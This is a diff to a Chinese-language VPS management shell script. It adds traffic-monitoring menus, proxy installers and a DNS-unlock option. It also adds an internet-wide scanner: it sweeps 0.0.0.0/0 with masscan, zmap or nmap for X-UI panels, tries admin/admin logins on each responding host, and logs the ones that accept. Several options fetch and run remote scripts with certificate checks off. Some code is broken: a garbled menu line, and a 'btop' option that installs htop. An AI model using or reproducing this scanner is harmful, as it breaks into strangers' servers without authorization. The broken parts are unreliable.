@@ -24,6 +24,8 @@ install_if_missing() {
     }
 }
 
+install_if_missing jq
+install_if_missing sudo
 install_if_missing curl
 install_if_missing wget
 
@@ -51,7 +53,9 @@ network_menu() {
     echo -e "\033[32m10)\033[0m 调整ipv4/6优先访问（非直接禁用）"
     echo -e "\033[32m11)\033[0m 禁用启用ICMP"
     echo -e "\033[32m12)\033[0m WARP"
-    echo -e "\033[32m13)\033[0m 返回主菜单"
+	echo -e "\033[32m13)\033[0m vnStat流量监控"
+	echo -e "\033[32m14)\033[0m iftop网络通信监控"
+    echo -e "\033[32m15)\033[0m 返回主菜单"
 }
 
 proxy_menu() {
@@ -64,7 +68,9 @@ proxy_menu() {
 	echo -e "\033[32m6)\033[0m 安装极光转发面板"
 	echo -e "\033[32m7)\033[0m 安装咸蛋转发面板"
 	echo -e "\033[32m8)\033[0m hy2一键脚本"
-    echo -e "\033[32m9)\033[0m 返回主菜单"
+	echo -e "\033[32m9)\033[0m DNS解锁服务器搭建"
+	echo -e "\033[32m10)\033[0m X-UI弱密码全网扫描"
+    echo -e "\033[32m11)\033[0m 返回主菜单echo -e "\033[32m8)\033[0m hy2一键脚本""
 }
 
 vps_test_menu() {
@@ -318,6 +324,96 @@ install_warp_script() {
     read -r
 }
 
+manage_vnstat() {
+    while true; do
+        clear
+        echo "请选择操作:"
+        echo "1) 安装并启动 vnStat"
+        echo "2) 查看日流量统计"
+        echo "3) 卸载 vnStat"
+        echo "4) 返回主菜单"
+        read -p "请输入你的选择: " choice
+
+        case $choice in
+            1)
+                echo "安装 vnStat..."
+                sudo apt-get update
+                sudo apt-get install -y vnstat
+
+                echo "启动 vnStat 服务..."
+                sudo systemctl start vnstat
+                sudo systemctl enable vnstat
+
+                echo "vnStat 安装并启动完成。"
+                read -p "按任意键继续..."
+                ;;
+            2)
+                echo "查看日流量统计..."
+                vnstat -d
+                read -p "按任意键继续..."
+                ;;
+            3)
+                echo "卸载 vnStat..."
+                sudo systemctl stop vnstat
+                sudo systemctl disable vnstat
+                sudo apt-get purge -y vnstat
+                sudo rm -rf /var/lib/vnstat
+                echo "vnStat 已卸载。"
+                read -p "按任意键继续..."
+                ;;
+            4)
+                return 0
+                ;;
+            *)
+                echo "无效的选择，请重试。"
+                read -p "按任意键继续..."
+                ;;
+        esac
+    done
+}
+
+manage_iftop() {
+    while true; do
+        clear
+        echo "请选择操作:"
+        echo "1) 安装 iftop"
+        echo "2) 运行 iftop"
+        echo "3) 卸载 iftop"
+        echo "4) 返回主菜单"
+        read -p "请输入你的选择: " choice
+
+        case $choice in
+            1)
+                echo "安装 iftop..."
+                sudo apt-get update
+                sudo apt-get install -y iftop
+                echo "iftop 安装完成。"
+                read -p "按任意键继续..."
+                ;;
+            2)
+                echo "运行 iftop..."
+                read -p "请输入要监控的网络接口 (例如 eth0): " interface
+                sudo iftop -i $interface
+                read -p "按任意键继续..."
+                ;;
+            3)
+                echo "卸载 iftop..."
+                sudo apt-get remove -y iftop
+                sudo apt-get purge -y iftop
+                echo "iftop 已卸载。"
+                read -p "按任意键继续..."
+                ;;
+            4)
+                return 0
+                ;;
+            *)
+                echo "无效的选择，请重试。"
+                read -p "按任意键继续..."
+                ;;
+        esac
+    done
+}
+
 xray_management() {
     clear
     echo -e "\033[32mxray 管理\033[0m"
@@ -419,9 +515,161 @@ install_xboard() {
 
 install_hy2_script() {
     clear
-    echo "运行hy2安装脚本..."
-    curl -sS -O https://raw.githubusercontent.com/cccchiban/BCSB/main/hy2.sh && chmod +x hy2.sh && ./hy2.sh
+    echo "请选择安装脚本："
+    echo "1. 使用自带hy2脚本 "
+    echo "2. 使用masakano hy2安装脚本 "
+    echo "请输入选项 (1 或 2)："
+    read -r option
+
+    case $option in
+        1)
+            echo "运行hy2安装脚本1..."
+            curl -sS -O https://raw.githubusercontent.com/cccchiban/BCSB/main/hy2.sh && chmod +x hy2.sh && ./hy2.sh
+            ;;
+        2)
+            echo "运行hy2安装脚本2..."
+            wget -N --no-check-certificate https://raw.githubusercontent.com/Misaka-blog/hysteria-install/main/hy2/hysteria.sh && bash hysteria.sh
+            ;;
+        *)
+            echo "无效的选项，请重新运行脚本并选择 1 或 2。"
+            return
+            ;;
+    esac
+
     echo "安装完成。按回车键返回菜单。"
+    read -r
+}
+
+install_dns_unlock_script() {
+    echo "请选择操作："
+    echo "1. 运行 DNS 解锁脚本"
+    echo "2. 卸载 DNS 解锁脚本"
+    read -rp "请输入选择 (1 或 2): " choice
+
+    if [[ "$choice" == "1" ]]; then
+        wget --no-check-certificate -O dnsmasq_sniproxy.sh https://raw.githubusercontent.com/myxuchangbin/dnsmasq_sniproxy_install/master/dnsmasq_sniproxy.sh
+        bash dnsmasq_sniproxy.sh -f
+        
+        read -rp "是否限制 IP 访问？(y/n): " limit_ip
+        if [[ "$limit_ip" == "y" ]]; then
+            if ! command -v iptables &> /dev/null; then
+                echo "iptables 未安装，正在安装..."
+                apt-get update && apt-get install -y iptables
+            fi
+            
+            iptables -A INPUT -p tcp --dport 53 -j DROP
+            
+            read -rp "请输入需要添加的白名单 IP（多个 IP 用空格分隔）: " -a whitelist_ips
+            for ip in "${whitelist_ips[@]}"; do
+                iptables -I INPUT -p tcp -s "$ip" --dport 53 -j ACCEPT
+            done
+            
+            iptables-save > /etc/iptables/rules.v4
+            echo "IP 访问限制已设置。"
+        fi
+        
+        echo "DNS 解锁脚本安装完成。按回车键返回菜单。"
+        read -r
+    elif [[ "$choice" == "2" ]]; then
+        wget --no-check-certificate -O dnsmasq_sniproxy.sh https://raw.githubusercontent.com/myxuchangbin/dnsmasq_sniproxy_install/master/dnsmasq_sniproxy.sh
+        bash dnsmasq_sniproxy.sh -u
+        
+        iptables -D INPUT -p tcp --dport 53 -j DROP
+        
+        echo "DNS 解锁脚本卸载完成。53 端口限制已移除。按回车键返回菜单。"
+        read -r
+    else
+        echo "无效选择，请重新运行脚本。"
+    fi
+}
+
+port_scan_and_management() {
+    clear
+	echo "方法来自https://www.nodeseek.com/post-1084-1"
+	echo "端口扫描有可能导致vps清退或收到abuse，请谨慎操作"
+    echo "1) 安装端口扫描工具并进行端口扫描和弱口令尝试"
+    echo "2) 卸载端口扫描工具"
+    echo "3) 退出"
+    read -p "请输入选项 (1-3): " operation
+
+    case $operation in
+        1)
+            echo "正在安装必要的软件包..."
+            sudo apt update
+            sudo apt install -y nmap zmap masscan
+
+            echo "选择扫描工具："
+            echo "1) masscan"
+            echo "2) zmap"
+            echo "3) nmap"
+            read -p "请输入选项 (1-3): " scan_tool
+
+            read -p "请输入目标端口 (默认: 54321): " target_port
+            target_port=${target_port:-54321}
+
+            read -p "请输入扫描结果输出文件名 (默认: scan.log): " scan_output
+            scan_output=${scan_output:-scan.log}
+
+            case $scan_tool in
+                1)
+                    echo "使用 masscan 进行端口扫描..."
+                    sudo masscan 0.0.0.0/0 -p$target_port --banners --exclude 255.255.255.255 -oJ scan.json
+                    scan_file="scan.json"
+                    ;;
+                2)
+                    echo "使用 zmap 进行端口扫描..."
+                    sudo zmap --target-port=$target_port --output-file=$scan_output
+                    scan_file=$scan_output
+                    ;;
+                3)
+                    echo "使用 nmap 进行端口扫描..."
+                    sudo nmap -sS 0.0.0.0/0 -p $target_port | grep -v failed > $scan_output
+                    scan_file=$scan_output
+                    ;;
+                *)
+                    echo "无效选项，退出..."
+                    return
+                    ;;
+            esac
+
+            echo "扫描完成，开始尝试弱口令登录..."
+
+            week_log="week.log"
+            all_log="all.log"
+
+            > $week_log
+            > $all_log
+
+            for ip_ad in $(sed -nE 's/.*"ip": "([^"]+)".*/\1/p' $scan_file); do
+                if curl --max-time 1 http://$ip_ad:$target_port; then
+                    res=$(curl "http://${ip_ad}:$target_port/login" --data-raw 'username=admin&password=admin' --compressed --insecure)
+                    if [[ "$res" =~ .*true.* ]]; then
+                        echo $ip_ad | tee -a $week_log
+                    fi
+                    echo $ip_ad | tee -a $all_log
+                fi
+            done
+
+            echo "弱口令尝试完成。"
+            echo "可以弱口令登录的机器保存在 $week_log。"
+            echo "所有被扫描的机器保存在 $all_log。"
+            ;;
+        2)
+            echo "正在卸载端口扫描工具..."
+            sudo apt remove -y nmap zmap masscan
+            echo "端口扫描工具卸载完成。"
+            ;;
+        3)
+            echo "退出..."
+            exit 0
+            ;;
+        *)
+            echo "无效选项，退出..."
+            return
+            ;;
+    esac
+
+    echo "按回车键返回菜单。"
     read -r
 }
 
@@ -596,7 +844,8 @@ function_script() {
         echo -e "\033[32m4)\033[0m 科技lion一键脚本工具"
         echo -e "\033[32m5)\033[0m BlueSkyXN 综合工具箱"
         echo -e "\033[32m6)\033[0m Docker备份/恢复脚本"
-        echo -e "\033[32m7)\033[0m 返回主菜单"
+        echo -e "\033[32m7)\033[0m btop进程管理"
+        echo -e "\033[32m8)\033[0m 返回主菜单"
         read -p "请输入你的选择: " function_choice
         case $function_choice in
             1)
@@ -655,6 +904,28 @@ function_script() {
                 esac
                 ;;
             7)
+                echo -e "\033[32m1)\033[0m 安装并启动btop"
+                echo -e "\033[32m2)\033[0m 卸载btop"
+                echo -e "\033[32m3)\033[0m 返回上一级菜单"
+                read -p "请输入你的选择: " btop_choice
+                case $btop_choice in
+                    1)
+                        sudo apt-get update
+                        sudo apt install htop
+                        htop
+                        ;;
+                    2)
+                        sudo apt-get remove --purge htop
+                        echo "btop已卸载。"
+                        ;;
+                    3)
+                        ;;
+                    *)
+                        echo "无效的选择，请重试。"
+                        ;;
+                esac
+                ;;
+            8)
                 return
                 ;;
             *)
@@ -780,10 +1051,12 @@ while true; do
                     7) tcp_window_tuning ;;
                     8) test_access_priority ;;
                     9) port_25_test ;;
-		    10) adjust_ipv_priority ;;
+		            10) adjust_ipv_priority ;;
                     11) manage_icmp ;;
-		    12) install_warp_script ;;
-                    13) break ;;
+		            12) install_warp_script ;;
+					13) manage_vnstat ;;
+					14) manage_iftop ;;
+                    15) break ;;
                     *) echo "无效的选择，请重试。" ;;
                 esac
             done
@@ -802,7 +1075,9 @@ while true; do
 					6) install_Aurora_script ;;
 					7) install_xiandan_script ;;
 					8) install_hy2_script ;;
-                    9) break ;;
+					9) install_dns_unlock_script ;;
+					10) port_scan_and_management ;;
+                    11) break ;;
                     *) echo "无效的选择，请重试。" ;;
                 esac
             done
